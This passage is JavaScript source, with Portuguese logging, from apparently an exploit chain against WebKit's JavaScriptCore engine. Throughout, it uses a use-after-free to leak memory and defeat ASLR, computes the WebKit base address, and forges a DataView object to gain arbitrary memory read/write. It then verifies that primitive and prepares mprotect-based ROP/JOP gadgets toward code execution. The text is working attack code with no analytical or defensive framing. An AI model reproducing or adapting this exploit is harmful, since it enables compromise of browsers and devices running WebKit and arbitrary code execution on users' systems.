            }

            if (current_size_uaf_success) {
                logFn(`[SCANNER] Comprimento de Array de vítima encontrado: ${best_victim_length_found} elementos. Interrompendo scanner.`, "good", "SCANNER");
                break;
            } else {
                logFn(`[SCANNER] Todas as tentativas falharam para Array Length = ${length}. Prosseguindo para o próximo comprimento.`, "error", "SCANNER");
            }
        }

        if (best_victim_length_found === -1) {
            const errMsg = "Falha crítica: Nenhum comprimento de Array resultou em um vazamento UAF bem-sucedido após escanear a faixa. Abortando exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }

        logFn(`SUCESSO GERAL: Vazamento de ASLR via UAF/TC concluído para Array Length = ${best_victim_length_found}.`, "good");

        let untagged_uaf_addr = _doubleToInt64_direct(best_leaked_double);
        const original_high = untagged_uaf_addr.high();
        const untagged_high = original_high & 0x0000FFFF;
        untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
        logFn(`Endereço vazado (untagged) do UAF: ${untagged_uaf_addr.toString(true)}`, "leak");

        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
        webkit_base_address = untagged_uaf_addr.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);

        if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
            const errMsg = `Base WebKit calculada (${webkit_base_address.toString(true)}) é inválida ou não alinhada mesmo após vazamento bem-sucedido. Abortando exploração.`;
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkit_base_address.toString(true)}`, "good");

        const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
        logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
        const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);

        if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
        } else {
             logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
        }
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");

        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
        const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
        logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");

        const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
        let universalRwSuccess = false;

        for (const candidate_m_mode of mModeCandidates) {
            logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
            universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                logFn,
                pauseFn,
                JSC_OFFSETS_PARAM,
                DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE,
                candidate_m_mode
            );
            if (universalRwSuccess) {
                found_m_mode = candidate_m_mode;
                logFn(`[${FNAME_CURRENT_TEST_BASE}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
                break;
            } else {
                logFn(`[${FNAME_CURRENT_TEST_BASE}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
                await pauseFn(LOCAL_SHORT_PAUSE);
            }
        }

        if (!universalRwSuccess) {
            const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        const dumpTargetUint8Array = new Uint8Array(0x100);
        hold_objects.push(dumpTargetUint8Array);
        const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
        logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
        await dumpMemory(dumpTargetAddr, 0x100, logFn, arb_read_universal_js_heap, "Uint8Array Real Dump (Post-Universal-RW)");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
        const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
        if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
            logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
        } else {
             logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
        }

        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
        const rwTestPostLeakStartTime = performance.now();

        const test_obj_post_leak = global_spray_objects.length > 0 ?
                                   global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
                                   { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
        hold_objects.push(test_obj_post_leak);
        logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");

        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

        const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
        if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
            throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
        }

        const original_val_prop = test_obj_post_leak.val1 || test_obj_post_leak.test_val_prop;
        logFn(`Valor original de 'val1'/'test_val_prop' no objeto de teste: ${toHex(original_val_prop)}`, 'debug');

        faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
        const read_back_val_prop = faked_obj_for_post_leak_test.val1;

        if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
            logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
        } else {
            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
            throw new Error("R/W verification post-ASLR leak failed.");
        }

        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária universal múltiplas vezes...", "info");
        let resistanceSuccessCount_post_leak = 0;
        const numResistanceTests = 10;
        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);

        for (let i = 0; i < numResistanceTests; i++) {
            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
            try {
                await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
                const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);

                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                    resistanceSuccessCount_post_leak++;
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                } else {
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                }
            } catch (resErr) {
                logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
            }
            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
        }
        if (resistanceSuccessCount_post_leak === numResistanceTests) {
            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
        } else {
            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
        }
        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");


        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
            details: {
                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
                foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A"
            }
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
        final_result.success = false;
        logFn(final_result.message, "critical");
    } finally {
        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        global_spray_objects = [];
        hold_objects = [];

        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
    }

    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    if (final_result.details) {
        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
        heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
        oob_value_of_best_result: 'N/A (UAF Strategy)',
        tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
    };
}
